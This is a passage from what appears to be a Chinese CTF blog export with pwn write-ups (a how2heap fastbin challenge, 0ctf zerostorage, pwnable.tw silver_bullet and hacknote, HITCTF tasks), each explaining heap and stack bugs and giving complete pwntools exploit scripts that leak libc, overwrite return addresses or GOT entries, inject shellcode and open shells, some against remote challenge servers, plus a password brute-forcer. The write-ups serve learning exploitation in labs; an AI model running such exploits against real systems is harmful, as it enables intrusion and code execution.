bytes char * sentence; //8 bytes int sentence_size; //4 bytes int sentence_padding;//4 bytes struct node *next; //8 bytes&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int input_sentence()&#123; int size; // eax@1 __int64 v1; // rbp@1 int _size; // er13@1 char *sentence; // r12@2 signed __int64 v4; // rbx@2 signed __int64 v5; // rbp@2 struct word *v6; // rax@2 int v7; // edx@2 __int64 v8; // rdx@9 __int64 v10; // rdx@11 _puts("Enter the sentence size:"); size = input_num(); v1 = (unsigned int)(size - 1); _size = size; if ( (unsigned int)v1 &gt; 0xFFFD ) puts("Invalid size"); _puts("Enter the sentence:"); sentence = (char *)malloc(_size); input_str((__int64)sentence, _size, 0); v4 = (signed __int64)(sentence + 1); v5 = (signed __int64)&amp;sentence[v1 + 2]; v6 = (struct word *)malloc(0x28uLL); v7 = 0; v6-&gt;word = (__int64)sentence; v6-&gt;word_size = 0; v6-&gt;sentence = (__int64)sentence; v6-&gt;sentence_size = _size; do &#123; while ( *(_BYTE *)(v4 - 1) != ' ' ) &#123; v6-&gt;word_size = ++v7;LABEL_4: if ( ++v4 == v5 ) goto LABEL_8; &#125; if ( v7 ) &#123; v10 = head; head = (__int64)v6; v6-&gt;next = v10; v6 = (struct word *)malloc(0x28uLL); v7 = 0; v6-&gt;word = v4; v6-&gt;word_size = 0; v6-&gt;sentence = (__int64)sentence; v6-&gt;sentence_size = _size; goto LABEL_4; &#125; v6-&gt;word = v4++; &#125; while ( v4 != v5 );LABEL_8: if ( v7 ) &#123; v8 = head; head = (__int64)v6; v6-&gt;next = v8; &#125; else &#123; free(v6); &#125; return _puts("Added sentence");&#125; search with a word输入一个单词，从链表的头部开始查找相同单词，找到之后将对应的sentence置为0，并free sentence指针所指空间。 123456789101112131415161718192021222324252627282930313233343536373839404142void search_word()&#123; int size; // ebp@1 void *v1; // r12@2 struct word *i; // rbx@2 char v3; // [sp+0h] [bp-38h]@8 _puts("Enter the word size:"); size = input_num(); if ( (unsigned int)(size - 1) &gt; 0xFFFD ) puts("Invalid size"); _puts("Enter the word:"); v1 = malloc(size); input_str((__int64)v1, size, 0); i = (struct word *)head; if ( head ) &#123; do &#123; if ( *(_BYTE *)i-&gt;sentence ) &#123; if ( i-&gt;word_size == size &amp;&amp; !memcmp((const void *)i-&gt;word, v1, size) ) &#123; __printf_chk(1LL, "Found %d: ", i-&gt;sentence_size); fwrite((const void *)i-&gt;sentence, 1uLL, i-&gt;sentence_size, stdout); putchar(10); _puts("Delete this sentence (y/n)?"); input_str((__int64)&amp;v3, 2, 1); if ( v3 == 'y' ) &#123; memset((void *)i-&gt;sentence, 0, i-&gt;sentence_size); free((void *)i-&gt;sentence); _puts("Deleted!"); &#125; &#125; &#125; i = (struct word *)i-&gt;next; &#125; while ( i ); &#125; free(v1);&#125; 漏洞本题共有两个漏洞： 第二个漏洞我确实没看出来，大概是不细心&amp;平时我也是这么写的= = 释放sentence之后对应指针没有置零，UAF漏洞和double-free漏洞。 input_num函数可以泄露栈中的内容。strtol函数的第二个参数endptr返回的是字符串中不能转换为数字的地址，当输入的首个字符就不能转换为数字时，即&amp;nptr == endptr，input_num就会将输入的字符串打印出来。当输入的字符数量为48时，input_str不会向结尾加入NULL，由此可以读出字符串之后栈中的内容。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162int input_num()&#123; int result; // eax@1 char *endptr; // [sp+8h] [bp-50h]@1 char nptr; // [sp+10h] [bp-48h]@1 __int64 v3; // [sp+48h] [bp-10h]@1 v3 = *MK_FP(__FS__, 40LL); input_str((__int64)&amp;nptr, 48, 1); result = strtol(&amp;nptr, &amp;endptr, 0); if ( endptr == &amp;nptr ) &#123; __printf_chk(1LL, "%s is not a valid number\n", &amp;nptr); result = input_num(); &#125; *MK_FP(__FS__, 40LL); return result;&#125;void __fastcall input_str(__int64 a1, int len, int a3)&#123; int v3; // er14@2 int idx; // ebx@2 _BYTE *v5; // rbp@4 int v6; // eax@4 if ( len &lt;= 0 ) &#123; idx = 0; &#125; else &#123; v3 = a3; idx = 0; while ( 1 ) &#123; v5 = (_BYTE *)(a1 + idx); v6 = fread((void *)(a1 + idx), 1uLL, 1uLL, stdin); if ( v6 &lt;= 0 ) break; if ( *v5 == 10 &amp;&amp; v3 ) &#123; if ( idx ) &#123; *v5 = 0; return; &#125; idx = v6 - 1; if ( len &lt;= v6 - 1 )//没有在末尾加0 break; &#125; else &#123; idx += v6; if ( len &lt;= idx )//没有在末尾加0 break; &#125; &#125; &#125; if ( idx != len ) puts("Not enough data");&#125; ​ 漏洞利用有了以上两个漏洞，再结合fastbin_dup_into_stack.c来看，我们需要泄露栈中地址，泄露libc地址（进而泄露system地址），将system函数写入栈中的返回地址处，执行system函数。 泄露栈地址（这个真的不是玄学吗？？） input_num函数是递归调用的，第一次输入48个字节后面没有其他东西，但是继续输入48个字节就有机会泄露栈中内容，即通过向上增长栈寻找可泄露的地址。 通过多次gdb的调试，发现泄露的内容是一个栈地址，但是我到现在还是不太明白，为什么这个栈地址加上某一偏移的地址其值能一直保持不变化。这里打一个问号。看别人的题解说，这里距离返回地址的位置比较近，可以确定的是，调用index sentence和 search word函数的返回地址都是0x400d60- 0x400e24范围内的，且压入返回地址的位置永恒不变，可以确定通过泄露的栈地址计算返回地址的栈地址，但是如何定位到含有“0x40”的地址，还没有搞清楚。 泄露libc地址 UAF漏洞可以达到这个目的。试想如果sentence（简称s1）的大小与一个node一样，都是40 bytes，那么当释放s1空间后，再输入一个新的sentence（简称s2，保证大小不是32-40字节，防止将刚释放的s1分配给它），这时会建立一个新的node（简称n2）存放word信息，就会将刚释放的s1的空间分配给n2，而且也能保证s1空间不再为NULL，绕过了对内容是否为空的检查： if ( *(_BYTE *)i-&gt;sentence ) 由于s1释放之后没有把指针置空，导致原来的node的word和sentence指针仍指向原来的位置，通过search并删除s1，使 n2 引用的是已释放的空间。 继续把已经释放的s1分配给新的sentence（简称s3），并通过向s3里写内容，伪造一个假的node结点，使其中sentence指针指向puts@got，这样在search成功之后，就会输出puts@got中的puts地址，从而泄露libc地址。 system函数覆盖栈中返回地址 按照其他大佬的思路，在泄露的栈地址之后找到了0x40用于表示chunk_size的地址，且距离返回地址较近，接下来就可以通过fastbin劫持将fastbin链表结点指向这个栈中地址。 为了配合0x40这个大小，可以新建两个0x40长度的sentence a和b，按照程序逻辑b对应的node结点将会在word链表的顶端。 然后通过search删除它们，fastbin中的结构如下: fastbin -&gt; a-&gt;b-&gt;NULL，由于node中的指针并没有置零，因此search的时候还会去检查已经释放的a和b空间是否符合条件。 search（’\x00’），先从word的顶端b对应的node开始检查，由于b中的FD指针为NULL，它不能通过if ( *(_BYTE *)i-&gt;sentence ) 的检测，接着来到a对应的node，即使node能够满足条件，但是由于a是fastbin中的第一个chunk，释放它将会引发错误。因此我们可以在最开始时候新建3个sentence a,b,c。这样fastbin中就是：fastbin -&gt;a -&gt;b -&gt; c -&gt; NULL ，然后再search(‘\00’)，删除掉b保留a，达到双重释放的目的，fastbin结构变成：fastbin -&gt;b -&gt;a -&gt;b -&gt;…… 释放之后，再申请相同大小的sentence导致b空间被分配，并通过改写b从而改掉处于fastbin中b的FD指针，使其指向栈中假的chunk。 接着把剩余的a和b再分配出去，再申请sentence将会返回栈中的假chunk，以写sentence的内容覆写返回地址。 exp（栈中偏移地址部分参考了其他大佬的数据，整体思路也是顺着这位大佬来的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from pwn import *context(arch="amd64", os="linux")context.log_level = 'debug'p = process("./search")def leak_stack(): p.recvuntil("Quit\n") p.sendline("a"*48) p.recvline() p.sendline("b"*48) leak = p.recvline().split(' ')[0][48:] return int(leak[::-1].encode('hex'), 16)def index(sentence): #p.recvuntil("Quit\n") p.sendline("2") p.recvuntil("Enter the sentence size:\n") p.sendline(str(len(sentence))) p.recvuntil("Enter the sentence:\n") p.sendline(sentence)def search(word): p.recvuntil("Quit\n") p.sendline("1") p.recvuntil("Enter the word size:\n") p.sendline(str(len(word))) p.recvuntil("Enter the word:\n") p.sendline(word)def leak_libc(): sentence = 'a'*12 + ' b ' sentence = sentence.ljust(40,'c') index(sentence) #delete s1 search('b') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') #n4 use s1 index('d'*64) #delete s1,but n4 still can use it=&gt;UAF search('\x00') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') #a new sentence share space with n4 puts_got = 0x602028 node =p64(0x400E90) #"Enter" node += p64(5) node += p64(puts_got) node += p64(64) index(node) #search 'Enter' to leak puts_address search('Enter') p.recvuntil("Found 64: ") puts_addr = u64(p.recv(8)) print "###puts_addr:0x%x" %puts_addr p.recvuntil("Delete this sentence (y/n)?") p.sendline('n') return puts_addrdef overwrite_retn(): index('a'*54+' d') index('b'*54+' d') index('c'*54+' d') # a-&gt;b-&gt;c-&gt;NULL search('d') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') # b-&gt;a-&gt;b-&gt;c-&gt;NULL search('\x00') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('n') # fake fastbin index(p64(stack_addr).ljust(56,'e')) # malloc a and b index('f'*56) index('g'*56) # overwrite the ret address with gadget pop_ret = 0x400e23 sentence = 'A'*30 sentence += p64(pop_ret) sentence += p64(binsh_addr) sentence += p64(system_addr) index(sentence) #leak stack addressstack_leak = leak_stack()stack_addr = stack_leak + 0x22 - 8#leak libc addressputs_addr = leak_libc()libc = ELF('libc.so')system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])binsh_addr = puts_addr - (libc.symbols['puts']-next(libc.search('/bin/sh')))#double free to edit the retn address in stackoverwrite_retn()p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unsortedbin_attack--0ctf zerostorage]]></title>
    <url>%2F2018%2F03%2F13%2Funsortedbin-attack-0ctf-zerostorage%2F</url>
    <content type="text"><![CDATA[unsortedbin attack代码中存在UAF漏洞时，可以通过操纵unsorted bin 的BK指针时，使其修改某一变量的值。举一个简单的例子: shellphish/how2heap/unsorted_bin_attack 一个unsorted bin，称为victim，victim具有UAF漏洞，则在释放后操作victim时，可以修改victim-&gt;bk为需要修改的变量var的地址-0x10，即&amp;var-0x10，这样在再次将victim分配时，会进行unlink操作，将var的值修改为unsorted bin头的地址： 123bck = victim-&gt;bk; //bck = &amp;var-0x10unsorted_chunk(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunk(av) //*(&amp;var-0x10+0x10) = unsorted_chunk(av) =&gt; var = unsorted_chunk(av) 典型的应用是修改global_max_fast，这个全局变量代表着fastbin 中能够放入的最大chunk的大小，通过修改这个值可以让所有的chunk释放之后都挂在fastbin上，由于fastbin的结构简单，是单链结构，进而进行fastbin攻击。 实例：0ctf zerostorage基本逻辑典型的对堆进行操作的题： insert函数中可以看出，有一个全局数组entries，应该是一个结构体数组，每一个结构体占24个字节，前四个字节记录是否使用中，接着四个字节的padding，然后是8字节的长度和8字节的内容地址信息，这里地址信息不是直接记录的，而是通过与/dev/urandom中的数字异或后存放的。 content内容地址的分配内存是分三种情况：x&lt; 128 直接分配大小为128；128&lt;=x&lt;=4096 分配大小为x；x&gt;4096只分配4096大小。 update函数用于重新编辑content，必要时重新分配内存，修改length和content addr。 merge函数合并两个entry对应的content，释放第一个entry的content，将第一个entry各项置零，并重新找到一个entry，把合并后的content地址赋给新的entry 的 content addr。 delete函数释放entry的content addr 所指的内存，并将指针置零，entry中的各项也置零，很安全，是free的正确使用方法。 view函数查看内容 漏洞虽然本题的delete函数非常安全，但是在merge函数中，如果输入的两个编号一样，将会先free 然后又把指针给另一个entry，即UAF。 漏洞利用本题开了所有保护，关键是PIE 本题还提到一条，之后会用到： 1Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel. libc地址泄露： 第一个释放的chunk（不是fastbin），其FD和BK指针都指向main_arena中bins结构中的unsorted bin头，main_arena中的各个值存放于libc中的bss段，因此，可以在merge 之后读取这一块的前八个字节，正好是libc中的地址，通过偏移可以计算出libc的基址。 由于本题开了PIE，因此不能直接获取程序中指令的地址，但是在 Notice中提到的【Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel】的操作系统存在着offsetlibc的漏洞，也就是说可以从libc的基址推断出程序的基址。 unsorted bin attack修改global_max_fast的值： update上一步提到的块，将BK修改为&amp;global_max_fast -0x10，FD修改为一个较大的值。再insert一个新的entry时，会将这个块从unsorted bin上unlink后分给新 entry的content，由此完成了对global_max_fast值的改写，接下来的所有块都将属于fastbin的范围。 fastbin劫持用于读取random的值： 再merge另外两个相同的块，此时释放的块将挂在fastbin上，设某一已经分配的entry的index为idx1，利用UAF修改该fastbin的FD指针为entries[idx1]，且保证entries[idx1]和merge的块在fastbin中的大小相同，如均为144，因为fastbin在分配时候会首先检查chunk的size字段是否为当前链中应该的大小。 之后再insert两次，第一次将merge的块从fastbin中摘除，此时fastbin的头就指向了entries[idx1]，第二次insert就把entries[idx1]分给了新的entry 称为 entries[idx3]，即entries[idx3]的content addr指向entries[idx1]。由于entries[idx3] + 0x16中记载的是entries[idx1]^random，通过update idx3将这个值读出后异或entries[idx1]，由此得到random的值 这次的shell的执行没有用system，学到了一个新的知识： one_gadget 再次update idx3，修改idx1下一个entry idx2的content addr处为 free_hook^ random，这样再update idx2时，相当于修改free_hook的值，将其写为one_gadget的地址。 exp由于目前手中没有Ubuntu 14.xx的系统，在此只记录思路，之后再做具体复现，exp可以参考 Hanquing Zhao 思路： 用#0，#1，…代表entries[0]，entries[1]；&amp;0，&amp;1，….代表堆上分配的各个content编号 123456789101112131415161718192021222324insert #0 -&gt; &amp;0insert #1 -&gt; &amp;1insert #2 -&gt; &amp;2merge #1,#1 =&gt; #3-&gt;&amp;1(已free)view #3 =&gt;读FD 泄露libc地址，进而获取one_gadget地址、entries地址和free_hook地址update #3 =&gt;覆写global_max_fast的值，之后所有chunk都属于fastbininsert #1 -&gt; &amp;1insert #4 -&gt; &amp;3insert #5 -&gt; &amp;4merge #4,#4 =&gt; #6-&gt;&amp;3(已free)update #6 =&gt;FD的值写成#5（entries[5]）的地址insert #7-&gt;&amp;3insert #8-&gt;#5 view #8 =&gt;获取random的值update #8 =&gt;覆写#6的各个字段，重点是将content_addr写为random^free_hookupdate #6 =&gt;在free_hook中写入one_gadget地址delete #0 =&gt;调用free_hook即one_gadget]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw-silver_bullet]]></title>
    <url>%2F2018%2F03%2F08%2Fpwnable-tw-silver-bullet%2F</url>
    <content type="text"><![CDATA[silver_bullet基本逻辑依旧是菜单类型的小游戏： 这道题就是create一个silver bullet（简称sb），输入的字符串长度就是sb的能量，power up会用strncat连接上新输入的字符串，仍旧是长度是能量，然后能量达到一定值时beat ，然后返回。 漏洞power_up函数中，用到了strncat，而该函数会在末尾主动加入\0。这个操作有机会覆盖s[48]，即记录字符串长度的最低位。 漏洞利用考虑到power_up只在s[48]&lt;=47时起作用，可以分两次操作：先create一个47长度的sb，然后power_up 1，通过strncat，\0就会覆盖s[48]，再计算长度时就为0+1=1 这样就可以继续再写47个字符了，并且是从s[48]之后开始写。 继续写的字符可以伪造ROP，当然为了返回，应该首先执行beat函数，将s[48]的之后三位写成FF FF FF，这样当以int类型读取字符串大小时（即从s[48]开始，长度为4的int），大小为FFFFFF01，就可以利用beat成功返回了。 system函数地址泄露：通过puts输出函数地址，从而泄露system的地址。因为可以继续写47个字符，将有机会覆写main的返回地址。将main的返回地址写为puts@plt，并在此处构造ROP结构，称为ROP1，puts函数的参数为puts@got，即读出puts的实际地址，进而泄露system地址。由于ROP1中不能继续构造新的ROP，因此将返回地址位置写为一个gadget。 system函数调用： 1）写入system函数–read_input：上一步只是泄露了system的地址，并未写入到栈结构中，因此需要另一次机会将system地址写入，程序中提供的read_input函数正好可以实现这个功能。这就要求从puts函数返回之后应该继续执行read_input函数，找到一个pop|retn 的gadget作为ROP1 的返回地址，执行时先pop出puts@got，再返回read_input。 接着构造一个read_input函数的ROP结构，称为ROP2。由于栈溢出只能再写47个字节，再写一个system的ROP结构不够用，因此考虑在另一块空间继续写入system的ROP结构。这个空间可以选在BSS段之后的地址，起名为fake_addr。read_input的第一个参数为fake_addr，第二个参数为大小，返回地址争取直接跳到fake_addr处。 在覆写main函数返回地址时将ebp覆写为fake_addr，之后保证ebp不变，在ROP2的返回地址处写入leave|retn的gadget使得 leave时 esp = ebp = fake_addr，pop ebp，然后返回执行system函数。 2）system函数的ROP：先是一个随意的值用于pop ebp，接着写入system地址和参数。 整体的栈结构如下： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level='debug'debug = 0if debug: p = process('./silver_bullet') libc = ELF('./libc.so')else: p = remote('chall.pwnable.tw',10103) libc = ELF('./libc_32.so.6')d = 0#gdb.attach(p,'b*0x80485eb')# create size:47p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Give me your description of bullet :')payload1 ='a' * 47p.send(payload1)# overflow size:1p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Give me your another description of bullet :')payload2 ='b'p.send(payload2)#overwrite stackp.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Give me your another description of bullet :')puts_plt = 0x80484a8puts_got = 0x804afdcfake_addr = 0x804b410pr_addr = 0x08048475lr_addr = 0x8048a18read_input = 0x80485ebpayload3 = '\xff' * 3 + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(0x1011)p.send(payload3)#beat and execute p.recvuntil('Your choice :')if d: gdb.attach(p)p.sendline('3')p.recvuntil('Oh ! You win !!\n')puts_addr = u32(p.recv(4))system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])print 'puts_addr: 0x%x' %puts_addr#read_input contentpayload = p32(fake_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(fake_addr + 0x10) + '/bin/sh'p.send(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw--hacknote]]></title>
    <url>%2F2018%2F03%2F08%2Fpwnable-tw-hacknote%2F</url>
    <content type="text"><![CDATA[hacknote基本逻辑这又是一道malloc相关的内存题目，但是不是老套路。三个函数：add_note，delete_note和print_note。 使用add_note分配的地址用一个堆表（自己起的名字）存放，（其实就是一个存放地址的数组）。通过add_note可以看出分配的每个块是什么结构： 首先在ptr[i]中存放一个8字节大小的block（实际malloc分配了16字节）地址；然后这个地址中（称为note块）前4个字节是一个函数地址，即输出地址+4中的内容： 另外四个字节存放一个新分配的content块的地址，大小size由用户进行输入。对于一个初始状态的地址空间，add_note后的结构如下： delete_note就是先释放content地址这块空间，再释放malloc（8）这块空间。 print_note就是调用note块的第一个字段即puts函数 漏洞deltenote将note和content释放之后并没有将ptr[i]置为空，也就是说，虽然指针所指向的内存释放掉了，但实际内容还在，我们仍然能使用，即UAF。 漏洞利用本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。 system函数地址泄露：print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。 system函数调用：同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 这里涉及一个知识点：Linux连续执行多条命令http://blog.csdn.net/freedom2028/article/details/7104131 仔细看print_note，最终调用函数时，参数也是同一个地址： 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\0’. exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level='debug'def add_note(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Note size :') p.sendline(str(size)) p.recvuntil('Content :') p.send(content)def delete_note(index): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index))def print_note(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))debug = 0 if debug: p = process('./hacknote') libc = ELF('./libc.so')else: p = remote('chall.pwnable.tw', 10102) libc = ELF('./libc_32.so.6')add_note(128,'aaaa')add_note(128,'bbbb')delete_note(1)delete_note(0)payload = p32(0x804862b)+p32(0x804A018)add_note(8,payload)print_note(1)free_addr = u32(p.recv(4))print "free_addr:%x" %free_addroffset = libc.symbols['system'] - libc.symbols['free']system_addr = free_addr + offsetdelete_note(2)payload = p32(system_addr) + ';sh\0'add_note(8,payload)print_note(1)if debug: gdb.attach(p)print "offset:%x,system_addr: %x" %(offset,system_addr)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCTF PWN]]></title>
    <url>%2F2018%2F02%2F07%2FHITCTF-PWN%2F</url>
    <content type="text"><![CDATA[STACK OVERFLOW基本逻辑main函数调用vuln函数，vuln函数中输入name字符串： 漏洞vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。 漏洞利用保护机制： NX堆栈不可执行 在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ： 通过栈溢出构造ROP：将vuln函数返回地址覆盖为flag，同时写入flag函数执行所需要的参数a1和a2。 exp123456789101112131415161718192021222324252627from pwn import *context.log_level = 'debug'debug = 0flag_addr = 0x080485DFif debug: p= process("./stackoverflow")else: p = remote("111.230.132.82",40000)payload= 'a'*44payload += p32(flag_addr)payload += p32(0xdeadbeef) + p32(0xdeadbeef)+p32(12648430)p.recvuntil("Welcome to pwn world!\nLeave your name:")p.sendline(payload)p.interactive() login基本逻辑 main函数首先调用login()函数，用户输入username和password后，与服务器端预设的值进行比较。有两个用户：root和lilac。需要注意的是，strncmp的第三个参数，这个参数代表需要比较多少个字符。仔细看login函数中的strncmp是有问题的。（见2.漏洞） 从login返回之后，main函数会对登录是否成功进行判定，只有当用户为root且通过了login函数的比对操作才能继续进行，其余情况都会直接exit。而且即使login函数通过了之后，main函数还接着调用了check()函数来再次检查用户名和密码。注意，仔细查看login和check函数中的strncmp的第三个参数是不一样的：login中第三个参数是用户输入的长度，check中是指定的长度。 漏洞123456n = read_input_raw(username, 16);v3 = read_input_raw(password, 32);if ( !strncmp(username,"root",n)&amp;&amp;!strncmp(password,"passwd_has_be_changed_in_remote_", v3) ) &#123; v1 = 0; &#125; login函数第三个参数是用户输入的字符串长度，比如，我们只输入一个字符，那么strncmp就只比较两个字符串的一个字符，如果恰巧蒙对了，strncmp就返回0（代表相等）；没蒙对就继续蒙，直到蒙到第一位是正确的。由此，可以通过暴力破解依次获取每一位password。需要注意的是，我们拿到的可执行文件和服务器上的不是一个，出题人在password处暗示我们了：passwd_hasbe changed_inremote 漏洞利用从check函数中可以看出，root用户的密码为32位。通过暴力破解，多次启动进程，从返回结果是否是”How can you login successful as root!”来判断该位是否正确。可以通过查看ASCII表中可见字符的范围来缩小暴力破解的次数，我用的是33-126。 exp12345678910111213141516171819202122232425#暴力破解debug = 0for num in range(0,32): for i in range(33,126): if debug: p= process("./login") else: p = remote("111.230.132.82",40001) p.recvuntil("Username: ") username = "root" p.sendline(username) p.recvuntil("Password: ") tmp = pwd+chr(i) p.sendline(tmp) hint = p.recvline() #print hint if "How can you login successful as root!" in hint: pwd+=chr(i) p.close() print pwd break p.close()print pwd 1234567891011121314151617#发送正确的username和passwordfrom pwn import *context.log_level = 'debug'debug = 0if debug: p= process("./login")else: p = remote("111.230.132.82",40001) p.recvuntil("Username: ")username = "root"p.sendline(username)p.recvuntil("Password: ")pwd="XXXXX" #此处就是上一步暴力破解获取的pwdp.sendline(pwd)p.interactive() DragonBall基本逻辑一个小游戏，一共有15块，要集齐七个龙珠才能许愿，我们能实现的操作有买龙珠、卖龙珠、打印龙珠和对着龙珠许愿：P。 买的时候龙珠5块钱一个，但是注意，if里面只判断了money是否为0，并没有判断&gt;0 卖的时候龙珠只有3块钱，但这里在后续我们利用漏洞起到了一定作用。 wish函数里，向v1里读入wish字符串，向v2里读入yes or no，正常人会用这么大的缓冲区放yes和no吗？？v2分配了0x38大小，但是读入的时候读了0x40个字符，也就是说可以有8个字节的缓冲区溢出。v1分配了0x30大小，但是读入的时候读了0x68个字节。 漏洞首先，buy函数里，只要money不是0，是负数也无所谓，可以无穷尽的买卖，这样很快就能达到7个龙珠了。 其次，wish函数里v1和v2都可以进行缓冲区溢出。v1读入的0x68个字节可以占用v2的空间，v2读入的0x40正好可以修改返回地址。 漏洞利用保护机制：喜大普奔！这题没有开NX！也就是可以在栈上写入shell并执行 利用的思路就是：在v1或v2的位置写入shell，然后要获取栈地址，并将这个地址通过v2写入wish的返回地址，最后wish返回之后就能直接执行shell。 其余都好弄，就是如何获取栈上的地址。在gdb调试过程中，通过查看栈，发现此时ebp的值为0xffffc818，向上两个单元中的值总是和ebp相差0x10，而这个位置正好可以通过读取v1来得到，这样就得到了栈上的地址。可以发现，wish中会将v1中的内容打印出来（Your wish is %s…）。由此，先将v1中这个位置之前的内容都填满，共0x68-8=0x60个字节，其中包含着可执行的shell；然后再通过v2将返回地址的位置填上v1的地址即可。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level='debug'debug = 0if debug: p = process('./DragonBall')else: p = remote('111.230.132.82',40002)#buy dragonballfor i in range(0,2): p.recvuntil('You choice: ') p.sendline('1')p.recvuntil('You choice: ')p.sendline('2')for i in range(0,6): p.recvuntil('You choice: ') p.sendline('1')#make a wishp.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')shellcode = asm(shellcraft.sh())payload = shellcode.ljust(0x60,'a')p.sendline(payload)p.recvuntil('Your wish is ')p.recv(0x60)stack_addr = u32(p.recv(4))wish_addr = stack_addr-0x10-0x68print "wish_addr:0x%x"%wish_addrp.recvuntil('is it right?\n(Y/N) ')payload = 60*'a'+p32(wish_addr)p.sendline(payload)p.interactive() nodes基本逻辑主要是对一个单向链表上的节点进行操作。 set_size函数是对BSS段上的一个值进行初始化，设置为48，这个字段后续要作为read函数的第三个参数。 main函数中限定了节点数最多为149. add_node函数，首先判断头节点是否存在，如果存在，就通过后向指针循环寻找下一节点，直到找到链表的尾部，添加新的节点；如果不存在，就构建头节点后再添加新的节点。 这里可以看见，read函数的第三个参数就是之前set_size函数里设置为48的那个字段unk_804a080。 通过add_node函数，可以了解到每一个节点的结构如下： edit_node函数通过value作为索引，找到对应节点，修改其data内容。 print_node顺序打印链表中每个节点的value和data。 漏洞说实话，这题的漏洞对我隐藏的太深了，我大概看了三个小时才找到漏洞。 main函数中的case 1，会打印已有的节点数，其中这个byte_904a060是一个bss段上的字段。 1sprintf(byte_804A060, "You have already insert %d nodes", nodes_num); 在bss段找到它，发现它实际分配了32字节的空间。 数一下You have already insert XXX nodes字符串，如果nodes_num是3位数，那么字符串长度为33位，也就是说，当添加的节点数大于等于100时就会触发堆溢出漏洞。从上图能够看出，byte_904a060之后正好就是 unk_804a080,就是最开始设置为48的read参数，一旦堆溢出，byte_904a060的最后一个字符s就会覆盖 unk_804a080，即read可以读入的字符串长度变成0x73，覆盖next指针的值，再次调用print_node时就会泄露内存。 漏洞利用system函数地址的泄露：首先申请100个节点，这时会造成堆溢出漏洞。这样read的第三个参数变得很大，通过edit_node将第99个节点的next指针覆写为puts函数的got表地址。再调用print_node时，第100个节点的地址就会变为puts函数的got表地址puts@got，打印出来的value也就是当前puts函数的真实地址。再通过libc中puts与system的相对便宜进一步得到system函数地址。再通过edit_node操作第100个节点，修改puts@got中的内容为system函数地址。 system函数调用： 当程序中调用puts时就相当于调用了system函数，可以事先在第一个节点的data中写入/bin/sh参数，当调用print_node时，触发puts(data)，即执行了system(‘/bin/sh’) exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *import timecontext.log_level='debug'debug = 0puts_got = 0x0804A024if debug: p = process('./nodes') libc = ELF('./libc.local.so')else: p = remote('111.230.132.82',40003) libc = ELF('./libc.so.6')#add 100p.recvuntil('please input your choice:')p.sendline('1')p.recvuntil('Value:')p.sendline('1')p.recvuntil('Data:')p.sendline('/bin/sh')for i in range(2,101): #time.sleep(1) p.recvuntil('please input your choice:') p.sendline('1') p.recvuntil('Value:') p.sendline(str(i)) p.recvuntil('Data:') p.sendline('')#edit no.99p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil("Node's value:")p.sendline('99')p.recvuntil('New value:')p.sendline('99')p.recvuntil('New data:')p.sendline('a'*48 + p32(puts_got))#list -&gt; leak puts_addrp.recvuntil('please input your choice:')p.sendline('3')p.recvuntil("Your nodes:")for i in range(1,100): p.recvuntil('Value:') p.recvuntil('Data:')p.recvuntil('Value:')puts_addr = int(p.recv(10))print "puts_addr:0x%x" %puts_addrsystem_addr = 